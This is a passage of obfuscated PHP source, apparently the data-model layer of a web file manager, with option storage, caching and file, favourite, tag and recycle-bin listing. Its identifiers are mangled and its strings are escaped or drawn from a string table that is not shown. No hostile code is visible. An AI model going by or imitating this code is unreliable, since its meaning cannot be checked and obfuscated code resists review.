"\x6d\x6f\x64\x69\146\171\x54\151\155\145", $²Úº•¹ = false) { $êÍ‡éé³ =& $_SERVER[‘ÆÜ‘œ]; $äàô˜½Ÿ = Model($this->modelType)->get(!1, $this->optionType, !0); $†Û‹Ğ”Ö = array_values($äàô˜½Ÿ); if ($†Û‹Ğ”Ö && $†Û‹Ğ”Ö[0] && !is_array($†Û‹Ğ”Ö[0])) { Model($this->modelType)->cacheRemove($this->optionType); $äàô˜½Ÿ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$äàô˜½Ÿ) { return $¹œ£… ? null : array(); } if (!$¹œ£… && $¹œ£… !== $êÍ‡éé³[229]) { $äàô˜½Ÿ = array_filter(array_values($äàô˜½Ÿ)); return array_sort_by($äàô˜½Ÿ, $¿ÍîÁ³¹, $²Úº•¹, $êÍ‡éé³[495]); } return $äàô˜½Ÿ[$êÍ‡éé³[496] . $¹œ£…]; } public function insert($—ÀÇãäš) { $×šø•¾ü =& $_SERVER[‘ÆÜ‘œ]; $—ÀÇãäš = array_field_key($—ÀÇãäš, $this->field); $¦ºúìÇŠ = Model($this->modelType)->get($×šø•¾ü[497], $this->optionType . $×šø•¾ü[498]); $¦ºúìÇŠ = $¦ºúìÇŠ ? $¦ºúìÇŠ : 0; $—ÀÇãäš[$×šø•¾ü[495]] = ++$¦ºúìÇŠ; $—ÀÇãäš[$×šø•¾ü[232]] = time(); $—ÀÇãäš[$×šø•¾ü[88]] = time(); Model($this->modelType)->set($×šø•¾ü[497], $¦ºúìÇŠ, $this->optionType . $×šø•¾ü[498]); Model($this->modelType)->set($×šø•¾ü[496] . $¦ºúìÇŠ, $—ÀÇãäš, $this->optionType); return $¦ºúìÇŠ; } public function insertArr($òÎ“Óã¡) { $­ÌÆ¦²Ì =& $_SERVER[‘ÆÜ‘œ]; if (!$òÎ“Óã¡ || !is_array($òÎ“Óã¡)) { return !1; } $«ç¿…ø = Model($this->modelType)->get($­ÌÆ¦²Ì[497], $this->optionType . $­ÌÆ¦²Ì[498]); $«ç¿…ø = $«ç¿…ø ? $«ç¿…ø : 0; $Ï”‰ºâ = array(); foreach ($òÎ“Óã¡ as $‹ü¼òğ) { $ ¡«Ğƒ = array_field_key($‹ü¼òğ, $this->field); $ ¡«Ğƒ[$­ÌÆ¦²Ì[495]] = ++$«ç¿…ø; $ ¡«Ğƒ[$­ÌÆ¦²Ì[232]] = time(); $ ¡«Ğƒ[$­ÌÆ¦²Ì[88]] = time(); $Ï”‰ºâ[$­ÌÆ¦²Ì[496] . $«ç¿…ø] = $ ¡«Ğƒ; } Model($this->modelType)->set($­ÌÆ¦²Ì[497], $«ç¿…ø, $this->optionType . $­ÌÆ¦²Ì[498]); Model($this->modelType)->set($Ï”‰ºâ, !1, $this->optionType); return $«ç¿…ø; } public function update($ÙÉ×Š¦Á, $÷‡Ùğ‡Õ) { $å¬ñÂë½ =& $_SERVER[‘ÆÜ‘œ]; $÷‡Ùğ‡Õ = array_field_key($÷‡Ùğ‡Õ, $this->field); $ì—Ó‚Î° = $this->listData($ÙÉ×Š¦Á); if (!$ì—Ó‚Î° || !$ÙÉ×Š¦Á) { return !1; } $÷‡Ùğ‡Õ = array_merge($ì—Ó‚Î°, $÷‡Ùğ‡Õ); $÷‡Ùğ‡Õ[$å¬ñÂë½[88]] = time(); return Model($this->modelType)->set($å¬ñÂë½[496] . $ÙÉ×Š¦Á, $÷‡Ùğ‡Õ, $this->optionType); } public function remove($Â÷–³…Ä) { if (!$Â÷–³…Ä) { return !1; } return Model($this->modelType)->remove($_SERVER[‘ÆÜ‘œ][496] . $Â÷–³…Ä, $this->optionType); } public function removeArr($ÍË¿¼ª·) { if (!$ÍË¿¼ª·) { return !0; } $‡çÑƒ¨Š = array(); foreach ($ÍË¿¼ª· as $¦Ø•Â¶) { $‡çÑƒ¨Š[] = $_SERVER[‘ÆÜ‘œ][496] . $¦Ø•Â¶; } return Model($this->modelType)->removeArr($‡çÑƒ¨Š, $this->optionType); } public function clear() { $«²˜Êôß =& $_SERVER[‘ÆÜ‘œ]; Model($this->modelType)->remove($«²˜Êôß[497], $this->optionType . $«²˜Êôß[498]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($©ìÏ¨Şå, $¢‚’ÚÎ) { if (!$¢‚’ÚÎ) { return !1; } $Âµ•á« = $this->listData(); $Âµ•á« = array_to_keyvalue($Âµ•á«, $©ìÏ¨Şå); return isset($Âµ•á«[$¢‚’ÚÎ]) ? $Âµ•á«[$¢‚’ÚÎ] : !1; } public function findByName($è°¢»Ë±) { return $this->findByKey($_SERVER[‘ÆÜ‘œ][32], $è°¢»Ë±); } protected function resetData($¥ÆÒ²) { $Ì”¹¤®† =& $_SERVER[‘ÆÜ‘œ]; if (!$¥ÆÒ²) { return; } $¥ÆÒ² = is_array($¥ÆÒ²) ? $¥ÆÒ² : array(); $§öôë¼â = array(); for ($‹éøàÂÒ = 0; $‹éøàÂÒ < count($¥ÆÒ²); $‹éøàÂÒ++) { if (!$¥ÆÒ²[$‹éøàÂÒ] || !$¥ÆÒ²[$‹éøàÂÒ][$Ì”¹¤®†[495]]) { continue; } $§öôë¼â[$Ì”¹¤®†[496] . $¥ÆÒ²[$‹éøàÂÒ][$Ì”¹¤®†[495]]] = $¥ÆÒ²[$‹éøàÂÒ]; } return Model($this->modelType)->set($§öôë¼â, !1, $this->optionType); } private function getAutoName($‘£¯Éï) { $Œ«“°¾› = array_to_keyvalue($this->listData(), $_SERVER[‘ÆÜ‘œ][32]); if (!$Œ«“°¾› || !isset($Œ«“°¾›[$‘£¯Éï])) { return $‘£¯Éï; } for ($ãº‹ãÜ‡ = 1; $ãº‹ãÜ‡ < count($Œ«“°¾›); $ãº‹ãÜ‡++) { $®Å¯‚”ö = $‘£¯Éï . "\x28{$ãº‹ãÜ‡}\x29"; if (!isset($Œ«“°¾›[$®Å¯‚”ö])) { return $®Å¯‚”ö; } } return $®Å¯‚”ö; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($“ú÷ò°® = false, $÷ÒÓÚÓ = '', $¶…’Ó®Ğ = false, $¶­Ï›¨Ë = true) { $ß…şÂ’ =& $_SERVER[‘ÆÜ‘œ]; $š–—¥°€ = $this->cacheGet($÷ÒÓÚÓ); $«Âàˆ  = $this->optionDefault($÷ÒÓÚÓ); $«Âàˆ  = is_array($«Âàˆ ) ? $«Âàˆ  : array(); if (is_array($š–—¥°€)) { if ($¶­Ï›¨Ë) { $š–—¥°€ = array_merge($«Âàˆ , $š–—¥°€); } return $“ú÷ò°® ? isset($š–—¥°€[$“ú÷ò°®]) ? $š–—¥°€[$“ú÷ò°®] : null : $š–—¥°€; } $«şÉ£¨¶ = $this->filterWhere(array($ß…şÂ’[33] => $÷ÒÓÚÓ)); $š–—¥°€ = $this->where($«şÉ£¨¶)->select(); $š–—¥°€ = array_to_keyvalue($š–—¥°€, $ß…şÂ’[95], $ß…şÂ’[460]); foreach ($š–—¥°€ as $Òç©à¡ => $ññªÊê£) { if ($¶…’Ó®Ğ || in_array($Òç©à¡, $this->jsonField)) { $š–—¥°€[$Òç©à¡] = json_decode($ññªÊê£, !0); } } $this->cacheSet($÷ÒÓÚÓ, $š–—¥°€); if ($¶­Ï›¨Ë) { $š–—¥°€ = array_merge($«Âàˆ , $š–—¥°€); } return $“ú÷ò°® ? $š–—¥°€[$“ú÷ò°®] : $š–—¥°€; } public function set($›ĞÚƒ‰ä, $‰á˜Öù = false, $ßÁ«µÊÅ = '') { $´Œ÷ô® =& $_SERVER[‘ÆÜ‘œ]; if (!$›ĞÚƒ‰ä) { return !0; } $îâô™ê’ = $this->get(!1, $ßÁ«µÊÅ, !1, !1); $îâô™ê’ = is_array($îâô™ê’) ? $îâô™ê’ : array(); $©¥³ŠÔ· = array(); $‡ëğÔâ„ = array(); $‰ù›‰õ² = array(); $û‘èÊà = is_array($›ĞÚƒ‰ä) ? $›ĞÚƒ‰ä : array($›ĞÚƒ‰ä => $‰á˜Öù); $ÇÊØâÆ = $this->filterWhere(array($´Œ÷ô®[33] => $ßÁ«µÊÅ)); foreach ($û‘èÊà as $»­úø–Ö => $şØğÆÕ) { if (is_array($şØğÆÕ)) { $şØğÆÕ = json_encode_force($şØğÆÕ); } $this->checkLength($şØğÆÕ, !1, $this->tableName . $´Œ÷ô®[4] . $›ĞÚƒ‰ä); $şØğÆÕ = self::textEncode($şØğÆÕ); if (array_key_exists($»­úø–Ö, $îâô™ê’)) { $ì¡®’­» = is_array($îâô™ê’[$»­úø–Ö]) ? json_encode_force($îâô™ê’[$»­úø–Ö]) : $îâô™ê’[$»­úø–Ö]; $ì¡®’­» = self::textEncode($ì¡®’­»); if ($ì¡®’­» === $şØğÆÕ) { continue; } $‡ëğÔâ„[] = array($´Œ÷ô®[95], $»­úø–Ö, $´Œ÷ô®[460], $şØğÆÕ, $´Œ÷ô®[88], time()); } else { $ñËÆ¨² = array($´Œ÷ô®[33] => $ßÁ«µÊÅ, $´Œ÷ô®[95] => $»­úø–Ö, $´Œ÷ô®[460] => $şØğÆÕ); $©¥³ŠÔ·[] = $this->filterWhere($ñËÆ¨²); } } if (!$©¥³ŠÔ· && !$‡ëğÔâ„) { return !0; } $this->cacheRemove($ßÁ«µÊÅ); $ô¯àÕòÂ = $this->cacheKey($´Œ÷ô®[499]); CacheLock::lock($ô¯àÕòÂ); if ($©¥³ŠÔ·) { $this->addAll($©¥³ŠÔ·); } if ($‡ëğÔâ„) { $this->saveAll($‡ëğÔâ„, $ÇÊØâÆ); } CacheLock::unlock($ô¯àÕòÂ); return !0; } protected function optionDefault($¹³©¤áä = '') { return !1; } public function setDeep($‰Ü¥Ôá•, $Ş—¼ûÄ = false, $•»´ªÒ = '') { $á³ƒÕÚò = explode($_SERVER[‘ÆÜ‘œ][10], $‰Ü¥Ôá•); $¬§ˆÃõü = $this->get(); array_set_value($¬§ˆÃõü, $‰Ü¥Ôá•, $Ş—¼ûÄ); $this->set($á³ƒÕÚò[0], $¬§ˆÃõü[$á³ƒÕÚò[0]], $•»´ªÒ); } public function remove($ªøÇ§˜Ê, $¸…ì¾Ê° = '') { $»‡€¼ëÈ =& $_SERVER[‘ÆÜ‘œ]; $this->cacheRemove($¸…ì¾Ê°); $ªşˆæ°Ã = $this->filterWhere(array($»‡€¼ëÈ[95] => $ªøÇ§˜Ê, $»‡€¼ëÈ[33] => $¸…ì¾Ê°)); if (is_null($ªøÇ§˜Ê)) { unset($ªşˆæ°Ã[$»‡€¼ëÈ[95]]); } return $this->where($ªşˆæ°Ã)->delete(); } public function removeArr($ĞµÆº³´, $·ñ¶ŠÈ± = '') { $Š‰Ä¸ıâ =& $_SERVER[‘ÆÜ‘œ]; if (!$ĞµÆº³´ || !is_array($ĞµÆº³´)) { return !0; } $this->cacheRemove($·ñ¶ŠÈ±); $ç†°İÎû = $this->filterWhere(array($Š‰Ä¸ıâ[33] => $·ñ¶ŠÈ±, $Š‰Ä¸ıâ[95] => array($Š‰Ä¸ıâ[7], $ĞµÆº³´))); return $this->where($ç†°İÎû)->delete(); } public function cacheSet($é …õ‹µ, $²ŞÇå = false) { return Cache::set($this->cacheKey($é …õ‹µ), $²ŞÇå); } public function cacheGet($ûâµ¬¡é) { return Cache::get($this->cacheKey($ûâµ¬¡é)); } public function cacheRemove($Ää®ÍğÊ) { return Cache::remove($this->cacheKey($Ää®ÍğÊ)); } protected function filterWhere($Àâºìì³) { return $Àâºìì³; } protected function cacheKey($²ƒ®ÑŞƒ) { return $²ƒ®ÑŞƒ; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\165\162\x63\145"; protected $tableMeta = array("\x74\141\x62\x6c\145\116\x61\155\x65" => "\x69\157\x5f\163\x6f\165\162\x63\x65\137\x6d\145\164\x61", "\x6d\145\164\141\106\151\145\x6c\144" => "\163\157\165\x72\x63\x65\111\104"); protected $dataAuto = array(array("\155\157\144\151\x66\x79\x54\151\x6d\145", "\164\x69\x6d\145", "\151\x6e\163\145\x72\x74", "\x66\165\156\x63\x74\x69\157\156"), array("\x63\x72\x65\141\164\145\x54\151\155\x65", "\x74\x69\155\145", "\x69\156\x73\x65\162\164", "\146\x75\x6e\143\x74\151\157\x6e"), array("\166\x69\x65\167\x54\151\x6d\x65", "\x74\x69\x6d\x65", "\x69\156\163\x65\162\x74", "\146\165\156\143\x74\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ùÀáã¥š) { return $this->listSource(array($_SERVER[‘ÆÜ‘œ][500] => $ùÀáã¥š)); } public function typeName($çìáş†Ó) { static $·ÓøÚ£¤ = array(self::TYPE_SYSTEM => "\163\x79\x73\164\145\155", self::TYPE_USER => "\165\163\145\162", self::TYPE_GROUP => "\147\x72\157\165\160"); return $·ÓøÚ£¤[$çìáş†Ó . $_SERVER[‘ÆÜ‘œ][12]]; } public function sourceListInfo($¿áóáÔç, $¾á…¯Ü = false) { $«ĞÜË” =& $_SERVER[‘ÆÜ‘œ]; $¿áóáÔç = $¿áóáÔç ? $¿áóáÔç : array(); $¿áóáÔç = array_filter(array_unique($¿áóáÔç)); if (!$¿áóáÔç) { return array(); } $°·¹×Ü– = $this->where(array($«ĞÜË”[192] => array($«ĞÜË”[7], $¿áóáÔç)))->select(); $this->_listDataApply($°·¹×Ü–, $¾á…¯Ü); return array_to_keyvalue($°·¹×Ü–, $«ĞÜË”[192]); } public function pathInfoFilter(&$°Ó’ÕÃÀ) { $µ°ÒùŸ =& $_SERVER[‘ÆÜ‘œ]; static $à‘šº¿ = false; static $õÃµ–ë = false; static $êèèş¿› = false; if (!$à‘šº¿) { $Ò’³ü½ä = $µ°ÒùŸ[501]; $Ò’³ü½ä .= $µ°ÒùŸ[502]; $Ò’³ü½ä .= $µ°ÒùŸ[503]; $šá¡òí = $µ°ÒùŸ[504]; $Ë©Ü¨ = explode($µ°ÒùŸ[50], $šá¡òí); $à‘šº¿ = explode($µ°ÒùŸ[50], $Ò’³ü½ä); $õÃµ–ë = array(); foreach ($à‘šº¿ as $°…©§‘) { if (in_array($°…©§‘, $Ë©Ü¨)) { continue; } $õÃµ–ë[] = $°…©§‘; } $êèèş¿› = explode($µ°ÒùŸ[50], $µ°ÒùŸ[505]); } foreach ($êèèş¿› as $»ûİøÔ) { if (isset($°Ó’ÕÃÀ[$»ûİøÔ])) { $°Ó’ÕÃÀ[$»ûİøÔ] = intval($°Ó’ÕÃÀ[$»ûİøÔ]); } } $°Ó’ÕÃÀ[$µ°ÒùŸ[87]] = $µ°ÒùŸ[506] . $°Ó’ÕÃÀ[$µ°ÒùŸ[192]] . $µ°ÒùŸ[507]; $°Ó’ÕÃÀ[$µ°ÒùŸ[33]] = $°Ó’ÕÃÀ[$µ°ÒùŸ[508]] == 1 ? $µ°ÒùŸ[78] : $µ°ÒùŸ[231]; $°Ó’ÕÃÀ[$µ°ÒùŸ[189]] = $this->typeName($°Ó’ÕÃÀ[$µ°ÒùŸ[189]]); if ($°Ó’ÕÃÀ[$µ°ÒùŸ[508]] != 1) { $°Ó’ÕÃÀ[$µ°ÒùŸ[167]] = $°Ó’ÕÃÀ[$µ°ÒùŸ[509]]; unset($°Ó’ÕÃÀ[$µ°ÒùŸ[509]]); } $ŞàÍ‘‘ = $à‘šº¿; if (isset($°Ó’ÕÃÀ[$µ°ÒùŸ[510]]) && $°Ó’ÕÃÀ[$µ°ÒùŸ[510]][$µ°ÒùŸ[511]] == -1) { $ŞàÍ‘‘ = $õÃµ–ë; } $°Ó’ÕÃÀ = array_field_key($°Ó’ÕÃÀ, $ŞàÍ‘‘); return $°Ó’ÕÃÀ; } public function listUserFav() { $ØšëªÅˆ =& $_SERVER[‘ÆÜ‘œ]; $ú°ôšÎœ = Model($ØšëªÅˆ[512])->listData(); $áü™Ğ½ö = array_filter_by_field($ú°ôšÎœ, $ØšëªÅˆ[33], $ØšëªÅˆ[513]); $áü™Ğ½ö = array_to_keyvalue($áü™Ğ½ö, $ØšëªÅˆ[12], $ØšëªÅˆ[87]); if ($áü™Ğ½ö) { $´†ùŞÑÉ = $this->listSource(array($ØšëªÅˆ[514] => array($ØšëªÅˆ[515], $áü™Ğ½ö))); } $´†ùŞÑÉ = array_to_keyvalue($´†ùŞÑÉ[$ØšëªÅˆ[455]], $ØšëªÅˆ[192]); foreach ($ú°ôšÎœ as &$™â‰ûÚ) { $™â‰ûÚ = array($ØšëªÅˆ[516] => $™â‰ûÚ[$ØšëªÅˆ[495]], $ØšëªÅˆ[517] => $™â‰ûÚ[$ØšëªÅˆ[32]], $ØšëªÅˆ[518] => $™â‰ûÚ[$ØšëªÅˆ[87]], $ØšëªÅˆ[519] => $™â‰ûÚ[$ØšëªÅˆ[33]], $ØšëªÅˆ[520] => $™â‰ûÚ[$ØšëªÅˆ[232]], $ØšëªÅˆ[521] => $™â‰ûÚ[$ØšëªÅˆ[88]]); if ($™â‰ûÚ[$ØšëªÅˆ[33]] == $ØšëªÅˆ[513] && $´†ùŞÑÉ[$™â‰ûÚ[$ØšëªÅˆ[87]]]) { $™â‰ûÚ[$ØšëªÅˆ[90]] = $´†ùŞÑÉ[$™â‰ûÚ[$ØšëªÅˆ[87]]]; } } unset($™â‰ûÚ); return $ú°ôšÎœ; } public function listUserTag($‹²ˆóÖí) { $â±ìÓ =& $_SERVER[‘ÆÜ‘œ]; if ($‹²ˆóÖí && !is_array($‹²ˆóÖí)) { $‹²ˆóÖí = array($‹²ˆóÖí); } $ä·˜ÛÄ = Model($â±ìÓ[522])->listData(); $–È÷¥Ìî = array(); $«ıÙê¥ = array(); foreach ($ä·˜ÛÄ as $…·˜ÊÂ¡) { $ñü‰ğÂ° = $…·˜ÊÂ¡[$â±ìÓ[87]]; if (!$ñü‰ğÂ°) { continue; } if (!isset($«ıÙê¥[$ñü‰ğÂ°])) { $«ıÙê¥[$ñü‰ğÂ°] = array(); } $«ıÙê¥[$ñü‰ğÂ°][] = $…·˜ÊÂ¡[$â±ìÓ[523]]; $–È÷¥Ìî[$…·˜ÊÂ¡[$â±ìÓ[87]]] = $…·˜ÊÂ¡; } $Ì¬ß€ = array(); $˜øş½¬ = array(); $Œˆ†½şò = array(); foreach ($«ıÙê¥ as $”áõó‰¾ => $ÁÀüÎÊõ) { $¬¨ÀıŠ¨ = !0; if (!$‹²ˆóÖí) { $Ì¬ß€[] = $”áõó‰¾; continue; } foreach ($‹²ˆóÖí as $®ƒ•óÏª) { if (!in_array($®ƒ•óÏª, $ÁÀüÎÊõ)) { $¬¨ÀıŠ¨ = !1; break; } } if (!$¬¨ÀıŠ¨) { continue; } if (!is_numeric($”áõó‰¾)) { $Êõ ïˆö = $–È÷¥Ìî[$”áõó‰¾]; $¾Øğµ»¤ = array($â±ìÓ[32] => $Êõ ïˆö[$â±ìÓ[32]], $â±ìÓ[87] => $Êõ ïˆö[$â±ìÓ[87]], $â±ìÓ[33] => $Êõ ïˆö[$â±ìÓ[33]], $â±ìÓ[90] => array($â±ìÓ[524] => 1), $â±ìÓ[233] => !0); if ($Êõ ïˆö[$â±ìÓ[33]] == $â±ìÓ[231]) { $Œˆ†½şò[] = $¾Øğµ»¤; } if ($Êõ ïˆö[$â±ìÓ[33]] == $â±ìÓ[78]) { $˜øş½¬[] = $¾Øğµ»¤; } continue; } $Ì¬ß€[] = $”áõó‰¾; } if ($Ì¬ß€) { $»ÆŸç†´ = $this->listSource(array($â±ìÓ[514] => array($â±ìÓ[515], $Ì¬ß€))); } $»ÆŸç†´ = $»ÆŸç†´ ? $»ÆŸç†´ : array($â±ìÓ[85] => array(), $â±ìÓ[86] => array()); $»ÆŸç†´[$â±ìÓ[85]] = array_merge($»ÆŸç†´[$â±ìÓ[85]], $˜øş½¬); $»ÆŸç†´[$â±ìÓ[86]] = array_merge($»ÆŸç†´[$â±ìÓ[86]], $Œˆ†½şò); if (isset($»ÆŸç†´[$â±ìÓ[452]]) && count($Ì¬ß€) == $»ÆŸç†´[$â±ìÓ[452]][$â±ìÓ[453]]) { return $»ÆŸç†´; } $Ğ†ÁğùÛ = array(); $¦ğ¨ãüı = array_to_keyvalue($»ÆŸç†´[$â±ìÓ[85]], $â±ìÓ[12], $â±ìÓ[192]); $×şÅÊ«– = array_to_keyvalue($»ÆŸç†´[$â±ìÓ[86]], $â±ìÓ[12], $â±ìÓ[192]); $Ë¾«ñ¡ò = array_merge($×şÅÊ«–, $¦ğ¨ãüı); foreach ($Ì¬ß€ as $ñü‰ğÂ°) { if (!in_array($ñü‰ğÂ°, $Ë¾«ñ¡ò)) { $Ğ†ÁğùÛ[] = $ñü‰ğÂ°; } } if ($Ğ†ÁğùÛ) { Model($â±ìÓ[525])->removeBySource($Ğ†ÁğùÛ); } return $»ÆŸç†´; } public function listUserRecycle() { $Ê·‚üŠß =& $_SERVER[‘ÆÜ‘œ]; $„µ¯Ÿ­ = Model($Ê·‚üŠß[526])->listData(); if (!$„µ¯Ÿ­) { return array(); } $ªÉ°¢• = array($Ê·‚üŠß[514] => array($Ê·‚üŠß[515], $„µ¯Ÿ­), $Ê·‚üŠß[527] => 1); return $this->listSource($ªÉ°¢•); } public function listSource($ƒâ¸îç, $ïŒî†  = 3000, $·Ü§¦îá = false) { $±¦²Ì‚‚ =& $_SERVER[‘ÆÜ‘œ]; if (!isset($ƒâ¸îç[$±¦²Ì‚‚[528]])) { $ƒâ¸îç[$±¦²Ì‚‚[528]] = 0; } if (isset($ƒâ¸îç[$±¦²Ì‚‚[191]]) && $ƒâ¸îç[$±¦²Ì‚‚[191]] == $±¦²Ì‚‚[229]) { $ƒâ¸îç[$±¦²Ì‚‚[509]] = array($±¦²Ì‚‚[473], $±¦²Ì‚‚[12]); } if (isset($ƒâ¸îç[$±¦²Ì‚‚[191]])) { $ƒâ¸îç[$±¦²Ì‚‚[191]] = intval($ƒâ¸îç[$±¦²Ì‚‚[191]]); } $âıö´Õó = $±¦²Ì‚‚[529]; $ü‡ğšı = $this->field($âıö´Õó)->_makeOrder()->where($ƒâ¸îç)->selectPage($ïŒî† ); $this->_listPageCheck($ü‡ğšı, $âıö´Õó, $ƒâ¸îç); $this->_listDataApply($ü‡ğšı[$±¦²Ì‚‚[455]], $·Ü§¦îá); $this->_listMake($ü‡ğšı); return $ü‡ğšı; } private function _listPageCheck(&$äùâÓÇ, $ËâÖ»€—, $àúĞ€¹) { $­âÁˆ« =& $_SERVER[‘ÆÜ‘œ]; if (!is_array($äùâÓÇ[$­âÁˆ«[452]])) { return; } $ñæÅç‘” = $äùâÓÇ[$­âÁˆ«[452]]; if ($ñæÅç‘”[$­âÁˆ«[454]] <= 1) { return; } if ($ñæÅç‘”[$­âÁˆ«[453]] >= 100000) { return; } if (Model($­âÁˆ«[530])->get($­âÁˆ«[531]) != $­âÁˆ«[532]) { return; } $ËâÖ»€— = str_replace(array($­âÁˆ«[53], $­âÁˆ«[427], $­âÁˆ«[286]), $­âÁˆ«[12], $ËâÖ»€—); $ËâÖ»€— = $­âÁˆ«[533] . str_replace($­âÁˆ«[50], $­âÁˆ«[534], $ËâÖ»€—) . $­âÁˆ«[535]; $İœÓ‚ˆÜ = $­âÁˆ«[536]; $İœÓ‚ˆÜ = $İœÓ‚ˆÜ . $­âÁˆ«[537]; $şí¡ç€¨ = $ñæÅç‘”[$­âÁˆ«[449]] * ($ñæÅç‘”[$­âÁˆ«[438]] - 1) . $­âÁˆ«[50] . $ñæÅç‘”[$­âÁˆ«[449]]; $Ññœ¡Ïİ = $this->_makeOrder(!0); $–øôîÕİ = $­âÁˆ«[533] . str_replace($­âÁˆ«[50], $­âÁˆ«[534], $Ññœ¡Ïİ[0]); if (strpos($–øôîÕİ, $­âÁˆ«[538])) { $–øôîÕİ = str_replace($­âÁˆ«[538], $­âÁˆ«[539], $–øôîÕİ); } else { $–øôîÕİ .= $­âÁˆ«[540] . $Ññœ¡Ïİ[1]; } $ÅŠØæ•¿ = array(); foreach ($àúĞ€¹ as $êƒšæÇñ => $¶Ó¿ÏğÀ) { $ÅŠØæ•¿[$­âÁˆ«[533] . $êƒšæÇñ] = $¶Ó¿ÏğÀ; } $this->alias($­âÁˆ«[541])->field($ËâÖ»€—)->limit($şí¡ç€¨)->order($–øôîÕİ); $ªÚ°Á»š = $this->join($İœÓ‚ˆÜ)->where($ÅŠØæ•¿)->select(); if ($ªÚ°Á»š) { $äùâÓÇ[$­âÁˆ«[455]] = $ªÚ°Á»š; } } protected function _makeOrder($»¸äşÌÊ = false) { $Øî›×¿ =& $_SERVER[‘ÆÜ‘œ]; $îôÉšš¸ = Model($Øî›×¿[542])->get($Øî›×¿[543]); $¦î¬ÀÓ‚ = Model($Øî›×¿[542])->get($Øî›×¿[544]); $Üõ÷Ò³ = array($Øî›×¿[545] => $Øî›×¿[546], $Øî›×¿[547] => $Øî›×¿[548]); $¤âïÚÊ = array($Øî›×¿[32] => $Øî›×¿[32], $Øî›×¿[79] => $Øî›×¿[79], $Øî›×¿[167] => $Øî›×¿[509], $Øî›×¿[549] => $Øî›×¿[549], $Øî›×¿[550] => $Øî›×¿[551], $Øî›×¿[232] => $Øî›×¿[232], $Øî›×¿[88] => $Øî›×¿[88]); $óç±ü¾ = Input::get($Øî›×¿[552], $Øî›×¿[7], $îôÉšš¸, array_keys($¤âïÚÊ)); $©úèÙƒç = Input::get($Øî›×¿[553], $Øî›×¿[7], $¦î¬ÀÓ‚, array_keys($Üõ÷Ò³)); if (!in_array($óç±ü¾, array_keys($¤âïÚÊ))) { $óç±ü¾ = $Øî›×¿[32]; } if (!in_array($©úèÙƒç, array_keys($Üõ÷Ò³))) { $óç±ü¾ = $Øî›×¿[545]; } if ($óç±ü¾ == $Øî›×¿[32]) { } $ŒÔ§âÈã = $Øî›×¿[554] . $¤âïÚÊ[$óç±ü¾] . $Øî›×¿[53] . $Üõ÷Ò³[$©úèÙƒç]; $ŒÔ§âÈã = rtrim(trim($ŒÔ§âÈã), $Øî›×¿[50]); if ($»¸äşÌÊ) { return array($ŒÔ§âÈã, $Üõ÷Ò³[$©úèÙƒç]); } return $this->order($ŒÔ§âÈã); } protected function _listDataApplyItem($«Ğõ˜ÌÀ, $–®à¥‘· = false) { $Ü¼¦±èŒ = array($«Ğõ˜ÌÀ); $this->_listDataApply($Ü¼¦±èŒ, $–®à¥‘·); return $Ü¼¦±èŒ[0]; } protected function _listDataApply(&$áöüÎ¥, $­Æª‚´® = false) { $èüºã¨ =& $_SERVER[‘ÆÜ‘œ]; if (!$áöüÎ¥) { $áöüÎ¥ = array(); return; } $®À­şİş = array_to_keyvalue($áöüÎ¥, $èüºã¨[12], $èüºã¨[192]); $®À­şİş = array_unique($®À­şİş); $®À­şİş = array_to_int($®À­şİş); $this->_listSourceCache($áöüÎ¥); if (!$­Æª‚´®) { $this->_listAppendMeta($áöüÎ¥, $®À­şİş); $this->_listAppendFileMeta($áöüÎ¥, $®À­şİş); $this->_listAppendChildren($áöüÎ¥, $®À­şİş); } $this->_listAppendPath($áöüÎ¥); $this->_listAppendAuth($áöüÎ¥); $this->_listAppendSourceInfo($áöüÎ¥, $®À­şİş); $this->_listAppendUser($áöüÎ¥); $this->_listFilterInfo($áöüÎ¥, $­Æª‚´®); $this->_listAppendAuthSecret($áöüÎ¥); } protected function _listSourceCache($¢• û¼…) { $¦Ô×Èã‚ =& $_SERVER[‘ÆÜ‘œ]; foreach ($¢• û¼… as $ÏÔ¤¬á¡) { self::$cacheSourceInfo[$¦Ô×Èã‚[555] . $ÏÔ¤¬á¡[$¦Ô×Èã‚[192]]] = $ÏÔ¤¬á¡; } } protected function _listFilterInfo(&$¼†ş§¤í, $¨€¥É¨Ä = false) { $æ›˜Ç«ß =& $_SERVER[‘ÆÜ‘œ]; foreach ($¼†ş§¤í as &$³´ÃÒ£ê) { $³´ÃÒ£ê = $this->pathInfoFilter($³´ÃÒ£ê); self::$cachePathInfo[$æ›˜Ç«ß[556] . intval($¨€¥É¨Ä) . $æ›˜Ç«ß[485] . $³´ÃÒ£ê[$æ›˜Ç«ß[192]]] = $³´ÃÒ£ê; } unset($³´ÃÒ£ê); } protected function _listMake(&$­óô°¸“) { $Şõ–Æáó =& $_SERVER[‘ÆÜ‘œ]; $­óô°¸“[$Şõ–Æáó[85]] = array(); $­óô°¸“[$Şõ–Æáó[86]] = array(); foreach ($­óô°¸“[$Şõ–Æáó[455]] as $¡”Î›Ùñ) { $ä·×ÙÏ§ = $¡”Î›Ùñ[$Şõ–Æáó[508]] == 1 ? $Şõ–Æáó[85] : $Şõ–Æáó[86]; $­óô°¸“[$ä·×ÙÏ§][] = $¡”Î›Ùñ; } unset($­óô°¸“[$Şõ–Æáó[455]]); } protected function _listAppendMeta(&$Ò®Çè¡¥, $ÉèÃªÔè) { $äò ÚÓü =& $_SERVER[‘ÆÜ‘œ]; $ßñáş’Œ = array($äò ÚÓü[514] => array($äò ÚÓü[515], $ÉèÃªÔè)); $ø’åòİƒ = Model($äò ÚÓü[557])->field($äò ÚÓü[558])->where($ßñáş’Œ)->select(); if (!$ø’åòİƒ) { return; } $´µ…Ëâ = array($äò ÚÓü[559], $äò ÚÓü[560], $äò ÚÓü[539]); $ù «İ÷” = array(); foreach ($ø’åòİƒ as $®á™Š®î) { if (!isset($ù «İ÷”[$®á™Š®î[$äò ÚÓü[192]]])) { $ù «İ÷”[$®á™Š®î[$äò ÚÓü[192]]] = array(); } if (in_array($®á™Š®î[$äò ÚÓü[95]], $´µ…Ëâ)) { continue; } if ($®á™Š®î[$äò ÚÓü[95]] 